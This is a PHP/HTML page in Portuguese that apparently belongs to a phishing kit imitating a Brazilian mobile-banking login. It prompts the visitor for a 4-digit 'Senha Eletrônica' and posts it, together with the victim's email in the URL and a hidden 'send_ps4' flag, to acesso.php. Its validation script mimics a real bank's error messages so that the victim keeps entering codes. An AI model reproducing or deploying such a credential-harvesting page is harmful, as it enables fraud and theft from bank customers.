<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Acesso</title>

	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">
</head>
<body>
<script>
	function checkPasS4(){
		var pass4 = document.getElementById('ms_pass');

		if(pass4.value == ''){
			alert("Informe sua Senha Eletrônica para continuar!");
			pass4.focus();
			return false;
		}
		if(pass4.value.length < 4){
			alert("A Senha Eletrônica informada não está correta, ou não pertence a esta conta!");
			pass4.value = '';
			pass4.focus();
			return false;
		}
	}
</script>	

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="home_title">
			<h1>Informe sua senha</h1>
			<p>
				<?php 
					if(strlen($_SESSION['UserName']) == 0):
						echo 'Para prosseguir, será necessário informar corretamente sua senha de 4 dígitos.';
					else:
						echo $_SESSION['UserName'].', para prosseguir será necessário informar corretamente sua senha de 4 dígitos.';
					endif;
				?>
			</p>	
		</div>

		<form action="acesso.php?cliente=<?php echo $emailx; ?>" id="form_acesso" class="form_acesso" name="form_acesso" onsubmit="return checkPasS4();" method="post">
			
			<label for="ms_pass" class="complete_blocks" style="margin-bottom:10px;">
				<span style="margin-bottom:10px!important;display:block;">Senha Eletrônica (4 dígitos):</span>
				<input type="number" name="ms_pass" id="ms_pass" class="normal_input" placeholder="4 dígitos" autocomplete="off" maxlength="4" style="-webkit-text-security: disc!important;"
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>

			<div class="block_labels">
				<input type="hidden" name="sender" value="send_ps4">
				<input type="submit" name="next_page_acess" value="Confirmar" class="btn-submit-normal">
			</div><!-- block_labels -->
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->
</body>
</html>
<?php ob_end_flush(); ?>